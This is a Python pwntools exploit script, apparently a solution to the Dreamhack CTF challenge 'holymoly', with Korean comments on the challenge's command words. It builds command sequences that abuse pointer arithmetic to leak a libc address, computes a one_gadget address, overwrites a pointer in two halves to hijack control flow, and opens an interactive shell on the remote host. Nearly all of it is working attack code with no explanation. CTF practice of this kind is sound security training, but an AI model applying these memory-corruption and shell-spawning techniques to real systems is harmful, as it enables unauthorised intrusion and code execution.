from pwn import *
  
context.log_level = 'info'
  
#p = process("./holymoly_patched")
p = remote("host8.dreamhack.games", 10113)
  
pause()
#define HOLYMOLY_ID         0x1000 증가
#define ROLYPOLY_ID         0x100  증가
#define MONOPOLY_ID         0x10   증가
#define GUACAMOLE_ID        0x1    증가
#define ROBOCARPOLI_ID      0x1000 감소
#define HALLIGALLI_ID       0x100  감소
#define BROCCOLI_ID         0x10   감소
#define BORDERCOLLIE_ID     0x1    감소
#define BLUEBERRY_ID        ptr 참조하여 출력
#define CRANBERRY_ID        ptr에 참조하여 var 입력
#define MYSTERY_ID          inc, dec 를 ptr에 할지 var에 할지 스치함
#define INVALID_ID          11
# 처음 switch는 ptr임
  

ex = b''
ex += b'mystery'
ex += b'holymoly'*0x404    
ex += b'monopoly'*0x2      
ex += b'guacamole'*0x8     
ex += b'blueberry'
ex += b'broccoli'*0x1
ex += b'mystery'
ex += b'holymoly'*0x401    
ex += b'rolypoly'*0x1      
ex += b'monopoly'*0xf
ex += b'guacamole'*0x6     
ex += b'cranberry'

ex += b'mystery'
ex += b'guacamole'*0x8
ex += b'mystery'
ex += b'broccoli'*0xf
ex += b'bordercollie'*0x6
ex += b'cranberry'
  
print(len(ex))
p.sendlineafter(b"? ", ex)
print_add = u64(p.recv(6)+b"\x00\x00")

libc_base = print_add -  0x61c90 # print_off
one_gadget = libc_base + 0xe3b01
print(hex(one_gadget))

one_up = one_gadget // 0x1000000
one_dn = one_gadget % 0x1000000
  
ex2 = b''
ex2 += b'mystery'
ex2 += b'holymoly'*0x404
ex2 += b'rolypoly'*0x0
ex2 += b'monopoly'*0x4
ex2 += b'guacamole'*0x8
ex2 += b'mystery'
for i in range((one_dn // 0x1000)):
    ex2 += b'holymoly'
for i in range(((one_dn % 0x1000) // 0x100)):
    ex2 += b'rolypoly'
for i in range(((one_dn % 0x100) // 0x10)):
    ex2 += b'monopoly'
for i in range((one_dn % 0x10)):
    ex2 += b'guacamole'
ex2 += b'cranberry'
ex2 += b'mystery'
  
ex2 += b'guacamole'*0x3
  
ex2 += b'mystery'
  
if(one_up > one_dn):
    for i in range(((one_up - one_dn) // 0x1000)):
        ex2 += b'holymoly'
    for i in range((((one_up - one_dn) % 0x1000) // 0x100)):
        ex2 += b'rolypoly'
    for i in range((((one_up - one_dn) % 0x100) // 0x10)):
        ex2 += b'monopoly'
    for i in range(((one_up - one_dn) % 0x10)):
        ex2 += b'guacamole'
else:
    for i in range(((one_dn-one_up) // 0x1000)):
        ex2 += b'robocarpoli'
    for i in range((((one_dn-one_up) % 0x1000) // 0x100)):
        ex2 += b'halligalli'
    for i in range((((one_dn - one_up) % 0x100) // 0x10)):
        ex2 += b'broccoli'
    for i in range(((one_dn - one_up) % 0x10)):
        ex2 += b'bordercollie'
  
 
ex2 += b'cranberry'
  
p.sendlineafter(b"? ", ex2)

print(len(ex2))

p.interactive()
